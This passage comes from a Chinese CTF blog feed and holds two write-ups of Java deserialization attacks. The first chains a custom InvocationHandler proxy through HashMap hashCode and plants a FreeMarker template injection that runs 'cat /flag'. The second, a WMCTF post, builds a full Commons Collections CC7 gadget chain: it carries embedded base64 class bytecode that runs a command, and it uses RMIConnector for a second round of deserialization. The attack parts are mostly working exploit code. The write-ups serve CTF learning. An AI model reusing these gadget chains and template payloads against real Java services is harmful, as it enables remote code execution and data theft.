<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">get</span><span class="params">(Object key)</span> &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> Boolean.valueOf(HtmlUploadUtil.uploadfile(<span class="built_in">this</span>.filename, <span class="built_in">this</span>.content));</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>而这里<code>this.filename, this.content</code>没有构造方法,我们可以反射修改上去</p>
<p>然后看哪里能调用get方,get方法回顾一下之前cc链 c1链AnnotationInvocationHandler.invoke会调用,还有 c7链的hashmap(AbstractMap)的equals，c6 链TiedMapEntry.getValue,</p>
<p>想到AnnotationInvocationHandler.invoke而且这里</p>
<p>也有类似的类HtmlInvocationHandler 继承了InvocationHandler,想到动态代理</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HtmlInvocationHandler</span> <span class="keyword">implements</span> <span class="title class_">InvocationHandler</span>, Serializable &#123;</span><br><span class="line">    <span class="keyword">public</span> Map obj;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">HtmlInvocationHandler</span><span class="params">()</span> &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">HtmlInvocationHandler</span><span class="params">(Map obj)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.obj = obj;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span> <span class="comment">// java.lang.reflect.InvocationHandler</span></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">invoke</span><span class="params">(Object proxy, Method method, Object[] args)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">result</span> <span class="operator">=</span> <span class="built_in">this</span>.obj.get(method.getName());</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>怎么触发这个invoke就是关键了</p>
<p>c3链的管网wp是BadAttributeValueExpException的tostring</p>
<p>但是我用的是hashcode</p>
<p>再分析一次在hashcode反序列化后会调用readobject的<code>putVal(hash(key), key, value, false, false);</code></p>
<p>继续跟进hash发现会调用key.hashCode()这样就能触发invoke了</p>
<p>然后就是怎么返回读文件了<a href="https://www.cnblogs.com/escape-w/p/17326592.html">freemarker模版注入 - Escape-w - 博客园 (cnblogs.com)</a></p>
<p>exp:</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> com.ycbjava.Utils.HtmlInvocationHandler;</span><br><span class="line"><span class="keyword">import</span> com.ycbjava.Utils.HtmlMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.*;</span><br><span class="line"><span class="keyword">import</span> java.net.URLEncoder;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">c</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">HtmlMap</span> <span class="variable">map</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HtmlMap</span>();</span><br><span class="line">        setFieldValue(map,<span class="string">&quot;content&quot;</span>,<span class="string">&quot;&lt;!DOCTYPE html&gt;\n&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;&lt;html lang=\&quot;en\&quot;&gt;\n&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;&lt;head&gt;\n&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;  &lt;meta charset=\&quot;UTF-8\&quot;&gt;\n&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;  &lt;title&gt;Hello&lt;/title&gt;\n&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;&lt;/head&gt;\n&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;&lt;body&gt;\n&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;你是谁？\n&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;我是$&#123;name&#125;\n&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;&lt;h3&gt;&lt;#assign ac=springMacroRequestContext.webApplicationContext&gt;\n&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;  &lt;#assign fc=ac.getBean(&#x27;freeMarkerConfiguration&#x27;)&gt;\n&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;    &lt;#assign dcr=fc.getDefaultConfiguration().getNewBuiltinClassResolver()&gt;\n&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;      &lt;#assign VOID=fc.setNewBuiltinClassResolver(dcr)&gt;$&#123;\&quot;freemarker.template.utility.Execute\&quot;?new()(\&quot;cat /flag\&quot;)&#125;&lt;/h3&gt;\n&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;&lt;/body&gt;\n&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;&lt;/html&gt;&quot;</span>);</span><br><span class="line">        setFieldValue(map,<span class="string">&quot;filename&quot;</span>,<span class="string">&quot;index.ftl&quot;</span>);</span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">map_handler</span> <span class="operator">=</span> <span class="keyword">new</span>  <span class="title class_">HtmlInvocationHandler</span>(map);</span><br><span class="line"></span><br><span class="line">        <span class="type">Map</span> <span class="variable">proxy_map</span> <span class="operator">=</span> (Map) Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(),<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Map.class&#125;,map_handler);</span><br><span class="line"></span><br><span class="line">        HashMap hashMap=<span class="keyword">new</span> <span class="title class_">HashMap</span> ();</span><br><span class="line">        hashMap.put(<span class="string">&quot;1&quot;</span>,<span class="string">&quot;1&quot;</span>);</span><br><span class="line">        <span class="type">Class</span> <span class="variable">nodeC</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.util.HashMap$Node&quot;</span>);</span><br><span class="line">        Constructor&lt;?&gt; nodeCons = nodeC.getDeclaredConstructor(<span class="type">int</span>.class, Object.class, Object.class, nodeC);</span><br><span class="line">        nodeCons.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">tab</span> <span class="operator">=</span> Array.newInstance(nodeC, <span class="number">1</span>);</span><br><span class="line">        Array.set(tab, <span class="number">0</span>, nodeCons.newInstance(<span class="number">0</span>, proxy_map, <span class="string">&quot;baicany&quot;</span>, <span class="literal">null</span>));</span><br><span class="line">        setFieldValue(hashMap, <span class="string">&quot;table&quot;</span>, tab);</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">barr</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(barr);</span><br><span class="line">        oos.writeObject(hashMap);</span><br><span class="line">        System.out.println(URLEncoder.encode(<span class="keyword">new</span> <span class="title class_">String</span>(Base64.getEncoder().encode(barr.toByteArray()))));</span><br><span class="line"><span class="comment">//        ByteArrayInputStream in = new ByteArrayInputStream(barr.toByteArray());</span></span><br><span class="line"><span class="comment">//        ObjectInputStream ois = new ObjectInputStream(in);</span></span><br><span class="line"><span class="comment">//        ois.readObject();</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object obj, String fieldName, Object value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>学习记录</category>
      </categories>
      <tags>
        <tag>web</tag>
      </tags>
  </entry>
  <entry>
    <title>cc7链思考+wmctf+ez_java_rce</title>
    <url>/2023/08/26/wmctf/</url>
    <content><![CDATA[<h1 id="CC7链进一步改进"><a href="#CC7链进一步改进" class="headerlink" title="CC7链进一步改进"></a>CC7链进一步改进</h1><p>前几天打wmctf的时候,怎么都打不出来,一直想怎么控制输入,其实原理都很简单,就一个异或</p>
<p>a^b&#x3D;b^a a^0&#x3D;a，之前学cc链没有好好的思考这个问题,唉,就感觉….</p>
<h2 id="cc7回顾"><a href="#cc7回顾" class="headerlink" title="cc7回顾"></a>cc7回顾</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[] &#123;</span><br><span class="line"><span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line"><span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;),</span><br><span class="line"><span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;Runtime.class ,<span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;),</span><br><span class="line"><span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;/System/Applications/Calculator.app/Contents/MacOS/C</span></span><br><span class="line"><span class="string">new ConstantTransformer(1)</span></span><br><span class="line"><span class="string">&#125;;</span></span><br><span class="line"><span class="string">Transformer transformerChain = new ChainedTransformer(faketransformers);</span></span><br></pre></td></tr></table></figure>

<p>之前是用chain来控制输入的因为以前传入的值是</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">map1.put(<span class="string">&quot;yy&quot;</span>,<span class="string">&quot;baicany&quot;</span>);</span><br><span class="line">map2.put(<span class="string">&quot;zZ&quot;</span>,<span class="string">&quot;baicany&quot;</span>);</span><br></pre></td></tr></table></figure>

<p>里面传入第一个值就是yy,所以现在为了控制输入,而不用chain</p>
<p>之前说过yy和zZ的hashcode相等才这么弄的,而且利用点从equals开始的</p>
<p>之前分析的不用管了,直接看到hashcode</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> <span class="type">int</span> <span class="title function_">hashCode</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> Objects.hashCode(key) ^ Objects.hashCode(value);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>所以这里是异或我们其实</p>
<figure class="highlight applescript"><table><tr><td class="code"><pre><span class="line">map2.<span class="keyword">put</span>(<span class="string">&quot;zZ&quot;</span>,<span class="string">&quot;yy&quot;</span>);</span><br><span class="line">map1.<span class="keyword">put</span>(<span class="string">&quot;baicany&quot;</span>,<span class="string">&quot;baicany&quot;</span>);</span><br><span class="line"></span><br><span class="line">map1.<span class="keyword">put</span>(<span class="string">&quot;yy&quot;</span>,<span class="string">&quot;baicany&quot;</span>);</span><br><span class="line">map1.<span class="keyword">put</span>(<span class="string">&quot;baicany&quot;</span>,<span class="string">&quot;yy&quot;</span>);</span><br></pre></td></tr></table></figure>

<p>这样hashcode也是一样的</p>
<p>因为禁用类只有RMIConnector打二次反序列了所以为了调用connect</p>
<p>所以为了调用理论上要这样</p>
<figure class="highlight haxe"><table><tr><td class="code"><pre><span class="line">InvokerTransformer connect = <span class="keyword">new</span> <span class="type">InvokerTransformer</span>(<span class="string">&quot;connect&quot;</span>, <span class="literal">null</span>, <span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line"> map1.put(RMIConnector,<span class="string">&quot;zZ&quot;</span>);</span><br><span class="line"> map1.put(<span class="string">&quot;yy&quot;</span>,RMIConnector);</span><br><span class="line"> </span><br></pre></td></tr></table></figure>

<p>但是因为lazymap所以不能直接这样,得想办法改改</p>
<p>写exp</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.management.remote.JMXServiceURL;</span><br><span class="line"><span class="keyword">import</span> javax.management.remote.rmi.RMIConnector;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Hashtable;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC7</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">obj</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        <span class="type">byte</span>[] code = Base64.getDecoder().decode(</span><br><span class="line">                <span class="string">&quot;yv66vgAAADQAIQoABgATCgAUABUIABYKABQAFwcAGAcAGQEABjxpbml0PgEAAygpVgEABENvZGUB&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;AA9MaW5lTnVtYmVyVGFibGUBAApFeGNlcHRpb25zBwAaAQAJdHJhbnNmb3JtAQByKExjb20vc3Vu&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;L29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO1tMY29tL3N1bi9vcmcvYXBhY2hl&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;L3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWBwAbAQCmKExj&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;b20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9h&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;cGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7TGNvbS9zdW4vb3JnL2FwYWNo&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;ZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEAClNvdXJj&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;ZUZpbGUBAAdpby5qYXZhDAAHAAgHABwMAB0AHgEABGNhbGMMAB8AIAEADGNvbS9sYWdvdS9pbwEA&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;QGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ydW50aW1lL0Fic3RyYWN0&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;VHJhbnNsZXQBABNqYXZhL2lvL0lPRXhjZXB0aW9uAQA5Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFu&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;L2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQARamF2YS9sYW5nL1J1bnRpbWUBAApn&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;ZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwAhAAUABgAAAAAAAwABAAcACAACAAkAAAAuAAIAAQAA&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;AA4qtwABuAACEgO2AARXsQAAAAEACgAAAA4AAwAAAAoABAALAA0ADAALAAAABAABAAwAAQANAA4A&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;AgAJAAAAGQAAAAMAAAABsQAAAAEACgAAAAYAAQAAAA8ACwAAAAQAAQAPAAEADQAQAAIACQAAABkA&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;AAAEAAAAAbEAAAABAAoAAAAGAAEAAAASAAsAAAAEAAEADwABABEAAAACABI=&quot;</span>);</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;code&#125;);</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;a&quot;</span>);</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">transformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;newTransformer&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;&#125;);</span><br><span class="line"></span><br><span class="line">        HashMap&lt;Object, Object&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        Map&lt;Object,Object&gt; lazyMap = LazyMap.decorate(map, <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>));</span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">tiedMapEntry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazyMap, obj);</span><br><span class="line"></span><br><span class="line">        HashMap&lt;Object, Object&gt; hashmap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        hashmap.put(tiedMapEntry, <span class="string">&quot;test&quot;</span>);</span><br><span class="line">        lazyMap.remove(obj);</span><br><span class="line"></span><br><span class="line">        setFieldValue(lazyMap,<span class="string">&quot;factory&quot;</span>, transformer);</span><br><span class="line"></span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">barr</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">toser</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(barr);</span><br><span class="line">        toser.writeObject(hashmap);</span><br><span class="line">        toser.close();</span><br><span class="line"></span><br><span class="line">        String exp= Base64.getEncoder().encodeToString(barr.toByteArray());</span><br><span class="line"></span><br><span class="line">        <span class="type">JMXServiceURL</span> <span class="variable">jmxServiceURL</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JMXServiceURL</span>(<span class="string">&quot;service:jmx:rmi://&quot;</span>);</span><br><span class="line">        setFieldValue(jmxServiceURL, <span class="string">&quot;urlPath&quot;</span>, <span class="string">&quot;/stub/&quot;</span>+exp);</span><br><span class="line">        <span class="type">RMIConnector</span> <span class="variable">rmiConnector</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RMIConnector</span>(jmxServiceURL, <span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="type">InvokerTransformer</span> <span class="variable">invokerTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;connect&quot;</span>, <span class="literal">null</span>, <span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Map</span> <span class="variable">hashMap1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">hashMap2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">lazyMap1</span> <span class="operator">=</span> LazyMap.decorate(hashMap1, invokerTransformer);</span><br><span class="line">        lazyMap1.put(<span class="string">&quot;0&quot;</span>, <span class="string">&quot;yy&quot;</span>);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">lazyMap2</span> <span class="operator">=</span> LazyMap.decorate(hashMap2, invokerTransformer);</span><br><span class="line">        lazyMap2.put(<span class="string">&quot;yy&quot;</span>, rmiConnector);</span><br><span class="line"></span><br><span class="line">        <span class="type">Hashtable</span> <span class="variable">hashtable</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Hashtable</span>();</span><br><span class="line">        hashtable.put(lazyMap1, <span class="number">1</span>);</span><br><span class="line">        hashtable.put(lazyMap2, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">table</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.util.HashMap&quot;</span>).getDeclaredField(<span class="string">&quot;table&quot;</span>);</span><br><span class="line">        table.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        Object[] array = (Object[])table.get(hashMap1);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">node</span> <span class="operator">=</span> array[<span class="number">0</span>];</span><br><span class="line">        <span class="keyword">if</span>(node == <span class="literal">null</span>)&#123;</span><br><span class="line">            node = array[<span class="number">1</span>];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">key</span> <span class="operator">=</span> node.getClass().getDeclaredField(<span class="string">&quot;key&quot;</span>);</span><br><span class="line">        key.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        key.set(node, rmiConnector);</span><br><span class="line"></span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">baos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(baos);</span><br><span class="line">        oos.writeObject(hashtable);</span><br><span class="line">        oos.close();</span><br><span class="line">    <span class="comment">// System.out.println(new String(Base64.getEncoder().encode(baos.toByteArray())));</span></span><br><span class="line">        <span class="type">ByteArrayInputStream</span> <span class="variable">in</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(baos.toByteArray());</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(in);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">ob</span> <span class="operator">=</span> ois.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object obj,String fieldname,Object value)</span><span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(fieldname);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj,value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>www真的很想说自己</p>
]]></content>
      <categories>
        <category>学习记录</category>
      </categories>
      <tags>
        <tag>web</tag>
      </tags>
  </entry>
</search>
